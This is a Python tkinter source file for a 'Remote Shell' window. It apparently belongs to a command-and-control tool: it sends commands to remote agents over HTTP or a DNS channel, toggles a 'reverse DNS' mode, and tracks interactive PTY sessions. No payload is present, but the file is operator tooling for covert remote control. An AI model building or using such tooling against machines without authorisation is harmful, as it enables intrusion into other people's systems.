import tkinter as tk
from tkinter import scrolledtext
from threading import Thread
import os
import time

def get_icon_path():
    base_dir = os.environ.get('TAO_BASE_DIR')
    if not base_dir:
        current_file_dir = os.path.dirname(os.path.abspath(__file__))
        base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
    
    return os.path.join(base_dir, "ico", "ico.ico")

class ShellConsoleWindow:
    
    def __init__(self, parent, controller):
        self.controller = controller
        self.window = tk.Toplevel(parent)
        self.window.title("Remote Shell")
        icon_path = get_icon_path()
        if os.path.exists(icon_path):
            try:
                self.window.wm_iconbitmap(icon_path)
            except Exception:
                pass
        self.window.geometry("700x500")
        self.window.resizable(False, False)
        self.window.configure(bg="#0D0D0D")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        
        self.command_history = []
        self.history_index = -1
        self._pending_exit = False
        
        self._build_ui()
        
        self.controller.shell_console = self
        
    def _build_ui(self):

        header = tk.Frame(self.window, bg="#2C1E1E", height=40)
        header.pack(side="top", fill="x", padx=5, pady=5)
        header.pack_propagate(False)
        
        mode = self._get_mode_label()
        agent_name = "Unknown"
        if self.controller.active_mode == "dns" and self.controller.dns_mode.current_agent_id:
            agent_name = self.controller.dns_mode.current_agent_id
        elif self.controller.selected_agent_data:
            agent_name = self.controller.selected_agent_data.get('device_name', 'Unknown')
        
        self.status_label = tk.Label(header, 
                                     text=f"Connected: {agent_name} | Mode: {mode}", 
                                     bg="#2C1E1E", fg="#4CAF50",
                                     font=("Consolas", 10, "bold"))
        self.status_label.pack(side="left", padx=10)

        tk.Button(header, text="Clear", command=self.clear_console,
                 bg="#555555", fg="white", font=("Arial", 9, "bold"),
                 padx=10, pady=3).pack(side="right", padx=5)

        if self.controller.active_mode == "dns":
            is_reversed = isinstance(
                self.controller.dns_mode.dns_server,
                __import__('network.dns_mode', fromlist=['ReverseDNSClient']).ReverseDNSClient
            ) if hasattr(self.controller, 'dns_mode') else False

            self._rdns_state = tk.IntVar(value=1 if is_reversed else 0)

            self.rdns_btn = tk.Button(
                header,
                text=f"Reverse DNS: {'1' if is_reversed else '0'}",
                command=self._toggle_reverse_dns,
                bg="#1565C0" if is_reversed else "#444444",
                fg="white",
                font=("Arial", 9, "bold"),
                padx=10, pady=3
            )
            self.rdns_btn.pack(side="right", padx=5)
        
        input_frame = tk.Frame(self.window, bg="#1A1A1A", height=50)
        input_frame.pack(side="bottom", fill="x", padx=10, pady=(5, 10))
        input_frame.pack_propagate(False)
        
        tk.Label(input_frame, text="❯", bg="#1A1A1A", fg="#00FF00",
                font=("Consolas", 12, "bold")).pack(side="left", padx=(5, 5))
        
        self.cmd_entry = tk.Entry(input_frame, bg="#0D0D0D", fg="#00FF00",
                                  font=("Consolas", 11), insertbackground="#00FF00",
                                  borderwidth=0)
        self.cmd_entry.pack(side="left", fill="both", expand=True, padx=5)
        self.cmd_entry.bind("<Return>", lambda e: self.send_command())
        self.cmd_entry.bind("<Up>", self.history_up)
        self.cmd_entry.bind("<Down>", self.history_down)
        self.cmd_entry.focus_set()
        
        tk.Button(input_frame, text="Send", command=self.send_command,
                 bg="#4CAF50", fg="white", font=("Arial", 9, "bold"),
                 padx=15, pady=5).pack(side="right", padx=5)

        console_frame = tk.Frame(self.window, bg="#0D0D0D")
        console_frame.pack(side="top", fill="both", expand=True, padx=10, pady=5)
        
        self.console_text = scrolledtext.ScrolledText(
            console_frame,
            bg="#0D0D0D",
            fg="#00FF00",
            font=("Consolas", 10),
            insertbackground="#00FF00",
            wrap="word",
            state="disabled"
        )
        self.console_text.pack(fill="both", expand=True)
        
        self._log("Type 'help' for available commands, 'exit' to close\n")

    def _get_mode_label(self):
        if self.controller.active_mode == "dns":
            try:
                from network.dns_mode import ReverseDNSClient
                if isinstance(self.controller.dns_mode.dns_server, ReverseDNSClient):
                    return "DNS, Reversed"
            except Exception:
                pass
            return "DNS"
        return self.controller.active_mode.upper()

    def update_mode_label(self):
        mode = self._get_mode_label()
        agent_name = "Unknown"
        if self.controller.active_mode == "dns" and self.controller.dns_mode.current_agent_id:
            agent_name = self.controller.dns_mode.current_agent_id
        elif self.controller.selected_agent_data:
            agent_name = self.controller.selected_agent_data.get('device_name', 'Unknown')
        self.status_label.config(text=f"Connected: {agent_name} | Mode: {mode}")

    def _toggle_reverse_dns(self):
        try:
            from network.dns_mode import ReverseDNSClient
            is_reversed = isinstance(self.controller.dns_mode.dns_server, ReverseDNSClient)
        except Exception:
            is_reversed = False

        if not is_reversed:
            self._log("SYS: Initiating Reverse DNS switch...")
            self.rdns_btn.config(
                state="disabled",
                bg="#888888",
                text="Reverse DNS: switching..."
            )
            Thread(target=self._do_enable_reverse_dns, daemon=True).start()
        else:

            self._log("SYS: Reverting to standard DNS...")
            self.rdns_btn.config(
                state="disabled",
                bg="#888888",
                text="Reverse DNS: switching..."
            )
            Thread(target=self._do_disable_reverse_dns, daemon=True).start()

    def _do_enable_reverse_dns(self):
        self.controller.dns_mode.send_reverse_dns_cmd()

        import time
        try:
            from network.dns_mode import ReverseDNSClient
        except Exception:
            return

        for _ in range(90): 
            time.sleep(1)
            try:
                if isinstance(self.controller.dns_mode.dns_server, ReverseDNSClient):
                    self.window.after(0, self._on_reverse_enabled)
                    return
            except Exception:
                pass

        self.window.after(0, self._on_reverse_timeout)

    def _do_disable_reverse_dns(self):

        import time
        dns_mode = self.controller.dns_mode
        if not dns_mode.dns_server or not dns_mode.current_agent_id:
            self.window.after(0, self._on_reverse_timeout)
            return

        dns_mode.dns_server.send_command(dns_mode.current_agent_id, "-reverse_dns_0")
        dns_mode.dns_server.agent_r(dns_mode.current_agent_id)
        time.sleep(3)

        Thread(target=self._revert_to_standard_dns, daemon=True).start()

    def _revert_to_standard_dns(self):

        import time
        dns_mode = self.controller.dns_mode

        captured_agent_id = dns_mode.current_agent_id
        creds = dns_mode.dns_credentials

        old_server = dns_mode.dns_server
        with dns_mode.lock:
            dns_mode.dns_server = None
        if old_server:
            old_server.stop()

        time.sleep(3)

        if not dns_mode.srvr_strt():
            self.controller._log_m("ERROR: Failed to restart standard DNS server")
            self.window.after(0, self._on_reverse_timeout)
            return

        self.controller._log_m("SYS: DNS server restarted, waiting for agent...")

        for _ in range(60):
            time.sleep(1)
            agents = dns_mode.dns_server.list_agent() if dns_mode.dns_server else []
            for agent in agents:
                if agent['id'] == captured_agent_id:
                    dns_mode.current_agent_id = captured_agent_id
                    self.window.after(0, self._on_reverse_disabled)
                    return

        self.controller._log_m("WARNING: Agent did not reconnect within 60s")
        self.window.after(0, self._on_reverse_disabled)

    def _on_reverse_enabled(self):
        self.rdns_btn.config(
            state="normal",
            bg="#1565C0",
            text="Reverse DNS: 1"
        )
        self.update_mode_label()

    def _on_reverse_disabled(self):
        self.rdns_btn.config(
            state="normal",
            bg="#444444",
            text="Reverse DNS: 0"
        )
        self.update_mode_label()

    def _on_reverse_timeout(self):

        self.rdns_btn.config(
            state="normal",
            bg="#444444",
            text="Reverse DNS: 0"
        )
        self._log("SYS: Reverse DNS switch timed out")

    def _log(self, message):
        self.console_text.config(state='normal')
        self.console_text.insert(tk.END, message + "\n")
        self.console_text.see(tk.END)
        self.console_text.config(state='disabled')
        
        if "=== PTY SHELL STARTED ===" in message:
            self.controller.in_interactive_session = True
            self._log("")
            self._log("SYS: Interactive session active")
        elif "--- PTY SESSION CLOSED" in message or "PTY shell closed" in message:
            self.controller.in_interactive_session = False
            self._log("SYS: Interactive session ended")
    
    def send_command(self):

        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        self.command_history.append(cmd)
        self.history_index = len(self.command_history)
        
        mode_prefix = "" if self.controller.active_mode == "dns" else ""
        self._log(f"{mode_prefix} ❯ {cmd}")
        
        self.cmd_entry.delete(0, tk.END)
        
        if cmd.lower() in ["cls", "clear"]:
            self.clear_console()
            return
        
        if cmd.lower() in ["exit", "quit"]:
            self._log("Sending exit command to agent...")
            self._pending_exit = True
            self._was_in_interactive_session = self.controller.in_interactive_session
            
            if self.controller.mode_switching:
                self._log("ERROR: Cannot send command while mode switch in progress")
                return

            if self.controller.active_mode == "dns":
                if self.controller.dns_mode.dns_cmd(cmd):
                    self.controller.awaiting_command_result = True
                else:
                    self._log("ERROR: Failed to send command")
            else:
                self.controller.awaiting_command_result = True
                url = self.controller.url_entry.get().strip()
                api_key = self.controller.api_key_entry.get().strip()
                if url and api_key:
                    Thread(target=self.controller.requests, args=(url, api_key, cmd), daemon=True).start()
                else:
                    self._log("ERROR: Missing HTTP credentials")
                    self._pending_exit = False
            return
        
        if self.controller.mode_switching:
            self._log("ERROR: Cannot send command while mode switch in progress")
            return
        
        if self.controller.active_mode == "dns":
            if self.controller.dns_mode.dns_cmd(cmd):
                self.controller.awaiting_command_result = True
            else:
                self._log("ERROR: Failed to send command")
        else:
            self.controller.awaiting_command_result = True
            url = self.controller.url_entry.get().strip()
            api_key = self.controller.api_key_entry.get().strip()
            if url and api_key:
                Thread(target=self.controller.requests, args=(url, api_key, cmd), daemon=True).start()
            else:
                self._log("ERROR: Missing HTTP credentials")

    def _check_exit_response(self):
        if not self._pending_exit:
            return
        
        if self.controller.awaiting_command_result:
            self.window.after(100, self._check_exit_response)
            return
        
        if hasattr(self, '_was_in_interactive_session') and self._was_in_interactive_session:
            if not self.controller.in_interactive_session:
                self._log("SYS: Exited interactive session")
                self._pending_exit = False
                self._was_in_interactive_session = False
            else:
                self.window.after(100, self._check_exit_response)
        else:
            self._log("SYS: Exit command completed")
            self._log("SYS: Closing terminal...")
            self.window.after(500, self._close_after_exit)

    def _close_after_exit(self):
        if hasattr(self.controller, 'shell_console'):
            self.controller.shell_console = None
        self.window.destroy()
    
    def history_up(self, event):
        if not self.command_history:
            return
        if self.history_index > 0:
            self.history_index -= 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.command_history[self.history_index])
    
    def history_down(self, event):
        if not self.command_history:
            return
        if self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.command_history[self.history_index])
        else:
            self.history_index = len(self.command_history)
            self.cmd_entry.delete(0, tk.END)
    
    def clear_console(self):
        self.console_text.config(state='normal')
        self.console_text.delete('1.0', tk.END)
        self.console_text.config(state='disabled')
        self._log("SYS: Console cleared\n")
    
    def on_close(self):
        self.controller._log_system("SYS: Terminal closed")
        if hasattr(self.controller, 'shell_console'):
            self.controller.shell_console = None
        self.window.destroy()